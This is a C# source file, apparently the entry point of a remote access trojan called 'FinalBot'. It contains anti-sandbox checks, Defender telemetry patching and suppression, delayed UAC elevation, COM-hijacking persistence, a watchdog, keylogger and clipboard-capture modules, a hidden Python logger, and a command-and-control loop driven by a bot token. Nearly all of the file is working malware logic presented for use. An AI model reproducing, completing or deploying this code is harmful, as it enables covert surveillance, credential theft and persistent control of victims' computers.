using System;
using System.IO;
using System.Net.Http;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text;
using VanguardCore;
using VanguardCore.Modules;
using VanguardCore.Defense;
using FinalBot.Modules;

namespace FinalBot
{
    class Program
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, EntryPoint = "GetModuleFileNameW")]
        private static extern uint Win32_GetModuleFileName(IntPtr hModule, [Out] StringBuilder lpFilename, uint nSize);

        private static Mutex? _mutex;

        private static void DebugLog(string msg)
        {
            try { File.AppendAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] {msg}\n"); } catch { }
        }

        private static void Log(string msg) => DebugLog(msg);

        public static async Task Main(string[] args)
        {
            AppDomain.CurrentDomain.UnhandledException += (s, e) => {
                DebugLog($"FATAL CRASH: {e.ExceptionObject}");
            };
            TaskScheduler.UnobservedTaskException += (s, e) => {
                DebugLog($"UNOBSERVED TASK ERROR: {e.Exception}");
                e.SetObserved();
            };

            // [PHASE 3] Advanced Anti-Sandbox Check (Black Edition)
            if (AntiAnalysis.CheckAll())
            {
                // Decoy / Silent Exit
                AntiAnalysis.EnterSleepMode(); 
                return;
            }

            // [V6.12] Initialize Crypto Keys first for reliable Vault access
            SafetyManager.StartupKeys();

            // [RED TEAM HARDENING] Silence Defender Telemetry Immediately
            SafetyManager.ApplyStealthPatches();

            DebugLog($"Startup: PID={Process.GetCurrentProcess().Id}, Admin={ElevationService.IsAdmin()}");
            
            bool isInjected = ElevationService.IsInjected();
            int fromPid = 0;
            string fromPath = "";
            
            string fromArg = Array.Find(args, a => a.StartsWith("--from="));
            if (fromArg != null && int.TryParse(fromArg.Split('=')[1], out var pidValue)) fromPid = pidValue;

            string guardianArg = Array.Find(args, a => a.StartsWith("--guardian="));
            if (guardianArg != null)
            {
                // Format: --guardian=PID:Path
                var parts = guardianArg.Split('=')[1].Split(':');
                if (parts.Length >= 2 && int.TryParse(parts[0], out var gPid))
                {
                    fromPid = gPid;
                    fromPath = parts[1];
                    // On systems like Windows, paths might contain colons (C:\), so we rejoin if needed
                    if (parts.Length > 2) fromPath = string.Join(":", parts, 1, parts.Length - 1);
                }
            }

            if (!isInjected && guardianArg == null)
            {
                bool createdNew;
                string mutexName = GetStableMutexName();
                _mutex = new Mutex(true, mutexName, out createdNew);

                if (!createdNew) 
                {
                    DebugLog("Mutex conflict: killing previous instances...");
                    string currentName = Process.GetCurrentProcess().ProcessName;
                    int currentId = Process.GetCurrentProcess().Id;
                    foreach (var proc in Process.GetProcessesByName(currentName)) {
                        if (proc.Id != currentId) {
                            try { 
                                proc.Kill(true); 
                                proc.WaitForExit(3000); 
                            } catch { }
                        }
                    }
                    Thread.Sleep(1000); 
                    _mutex?.Dispose();
                    _mutex = new Mutex(true, mutexName, out createdNew);
                    if (!createdNew) {
                        DebugLog("Failed to acquire mutex after cleanup. Exiting.");
                        return;
                    }
                }
                DebugLog($"Mutex acquired: {mutexName}.");
            }
            else
            {
                DebugLog($"Running as {(isInjected ? "INJECTED" : "GUARDIAN")} child from PID {fromPid}.");
                if (fromPid > 0) 
                {
                    // WatchdogManager now requires the path to the process it's guarding
                    WatchdogManager.Start(fromPid, fromPath);
                }
            }

            try { ResourceModule.ExtractAll(); }
            catch (Exception ex) { 
                DebugLog($"Resource extraction failed: {ex.Message}"); 
                return; 
            }

            SafetyManager.AntiBehavior();

            // UAC Child Signaling
            if (Array.Exists(args, a => a == "--uac-child") || isInjected)
            {
                try 
                {
                    string evArg = Array.Find(args, a => a.StartsWith("--event="));
                    string evName = evArg != null ? evArg.Split('=')[1] : "Global\\Vanguard_Success";
                    using var successEvent = new EventWaitHandle(false, EventResetMode.ManualReset, evName);
                    successEvent.Set();
                    DebugLog($"Signal sent to: {evName}");
                } catch { }
            }

            // Lazy UAC Elevation
            if (!isInjected && !ElevationService.IsAdmin())
            {
                _ = Task.Run(async () =>
                {
                    try {
                        Random r = new Random();
                        await Task.Delay(r.Next(30000, 60000));
                        var sb = new StringBuilder(1024);
                        Win32_GetModuleFileName(IntPtr.Zero, sb, (uint)sb.Capacity);
                        string selfPath = sb.ToString();
                        _mutex?.Dispose();
                        if (ElevationService.RequestElevation(selfPath)) Process.GetCurrentProcess().Kill();
                        _mutex = new Mutex(true, GetStableMutexName(), out _);
                    } catch { }
                });
            }
            else if (ElevationService.IsAdmin())
            {
                DebugLog("Running as ADMIN. Applying Defender suppressions.");
                SafetyManager.ApplyDefenderSettings();
            }

            // [PHASE 5] Stealth Persistence (COM Hijacking)
            PersistenceService.InstallStealthProxy();

            // --- Resilience Loop ---
            while (true)
            {
                try 
                {
                    DebugLog("Initializing core services...");
                    ConfigManager.Load();
                    string token = ConfigManager.Get("BOT_TOKEN");
                    string adminId = ConfigManager.Get("ADMIN_ID");
                    var httpClient = await ProxyTunnel.GetBestHttpClient();
                    var orchestrator = new BotOrchestrator(token, adminId, httpClient);
                    
                    KeyloggerModule.Start(); 
                    ClipboardModule.Start(); 
                    
                    _ = Task.Run(() => {
                        try {
                            string lp = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "GlobalLogger.py");
                            if (File.Exists(lp)) Process.Start(new ProcessStartInfo { FileName = "python", Arguments = $"\"{lp}\"", CreateNoWindow = true });
                        } catch { }
                    });

                    DebugLog("C2 Orchestrator Starting...");
                    await orchestrator.StartAsync();
                }
                catch (Exception ex) 
                { 
                    DebugLog($"RESILIENCE ERROR: {ex.Message}. Restarting in 60s...");
                    await Task.Delay(60000); // Backoff before restart
                }
            }
        }

        private static string GetStableMutexName()
        {
            try {
                string seed = Environment.MachineName + Environment.UserName;
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography")) {
                    if (key != null) seed = key.GetValue("MachineGuid")?.ToString() ?? seed;
                }
                using var sha = System.Security.Cryptography.SHA256.Create();
                byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(seed));
                return "Global\\" + new Guid(hash.AsSpan(0, 16).ToArray()).ToString("B").ToUpper();
            } catch { return "Global\\{C2F9B8A1-4D3E-4B02-8F71-A9D6E5C3B2A1}"; }
        }
    }
}
